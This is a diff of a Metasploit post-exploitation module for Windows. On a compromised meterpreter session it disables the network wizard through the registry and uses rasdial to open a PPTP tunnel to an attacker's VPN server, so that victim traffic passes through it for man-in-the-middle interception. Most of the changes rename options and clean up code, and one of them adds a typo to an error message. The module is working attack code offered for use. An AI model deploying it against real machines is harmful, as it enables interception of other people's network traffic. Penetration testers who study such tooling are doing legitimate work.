@@ -16,16 +16,18 @@ class Metasploit3 < Msf::Post
 		super( update_info( info,
 			'Name'          => 'Windows Manage Remote Point-to-Point Tunneling Protocol',
 			'Description'   => %q{
-					This module initiates a PPTP connection to a remote machine (VPN server). Once the
-				tunnel is created we can use it to force the victim traffic to go through the server getting
-				a man in the middle attack. Be sure to allow forwarding and masquerading in the server},
+					This module initiates a PPTP connection to a remote machine (VPN server). Once
+				the tunnel is created we can use it to force the victim traffic to go through the
+				server getting a man in the middle attack. Be sure to allow forwarding and
+				masquerading on the VPN server (mitm).
+			},
 			'License'       => MSF_LICENSE,
-			'Author'        => [ 'Borja Merino <bmerinofe[at]gmail.com>'],
+			'Author'        => 'Borja Merino <bmerinofe[at]gmail.com>',
 			'References'    =>
-								[
-									['URL', 'http://www.youtube.com/watch?v=vdppEZjMPCM&hd=1']
-								],
-			'Platform'      => [ 'windows' ],
+				[
+					[ 'URL', 'http://www.youtube.com/watch?v=vdppEZjMPCM&hd=1' ]
+				],
+			'Platform'      => 'windows',
 			'SessionTypes'  => [ 'meterpreter' ]
 		))
 
@@ -33,10 +35,10 @@ class Metasploit3 < Msf::Post
 			[
 				OptString.new('USERNAME', [true, 'VPN Username.' ]),
 				OptString.new('PASSWORD', [true, 'VPN Password.' ]),
-				OptBool.new('MIM', [true, 'Man in the middle.', true]),
+				OptBool.new('MITM', [true, 'Man in the middle.', true]),
 				OptInt.new('TIMEOUT', [true, 'Timeout for the tunnel creation.', 60]),
 				OptString.new('PBK_NAME', [true, 'PhoneBook entry name.', 'MSF']),
-				OptAddress.new('RHOST', [true, 'VPN server.'])
+				OptAddress.new('VPNHOST', [true, 'VPN server.'])
 			], self.class)
 	end
 
@@ -44,11 +46,11 @@ class Metasploit3 < Msf::Post
 	def run
 		disable_network_wizard if sysinfo["OS"] =~ /Windows 7|Vista|2008/
 
-		pbk = create_pbk(datastore['MIM'],datastore['PBK_NAME'])
+		pbk = create_pbk(datastore['MITM'],datastore['PBK_NAME'])
 		to = (datastore['TIMEOUT'] <= 0 ) ? 60 : datastore['TIMEOUT']
 		begin
 			::Timeout.timeout(to) do
-			run_rasdial(pbk,datastore['USERNAME'],datastore['PASSWORD'],datastore['CONNECTION_NAME'],datastore['RHOST'],datastore['PBK_NAME'])
+			run_rasdial(pbk,datastore['USERNAME'],datastore['PASSWORD'], datastore['VPNHOST'],datastore['PBK_NAME'])
 			end
 		rescue ::Timeout::Error
 				print_error("Timeout after #{to} seconds")
@@ -71,8 +73,8 @@ class Metasploit3 < Msf::Post
 				registry_setvaldata(key,value,3,"REG_BINARY")
 				print_good("Network Wizard disabled")
 			end
-		rescue::Exception => e
-			print_status("The following Error was encountered: #{e.class} #{e}")
+		rescue ::Exception => e
+			print_status("The fo llowing Error was encountered: #{e.class} #{e}")
 		end
 	end
 
@@ -94,10 +96,10 @@ class Metasploit3 < Msf::Post
 	end
 
 
-	def run_rasdial(pbk,user,pass,conn,rhost,pbk_name)
+	def run_rasdial(pbk,user,pass,vpn_host,pbk_name)
 		print_status ("Establishing connection ...")
 		cmd_exec("rasdial","/disconnect")
-		output_run = cmd_exec("rasdial","#{pbk_name} #{user} #{pass} /PHONE:#{rhost} /PHONEBOOK:#{pbk}")
+		output_run = cmd_exec("rasdial","#{pbk_name} #{user} #{pass} /PHONE:#{vpn_host} /PHONEBOOK:#{pbk}")
 		output_view = cmd_exec("rasdial", nil)
 
 		if output_view =~ /#{pbk_name}/i
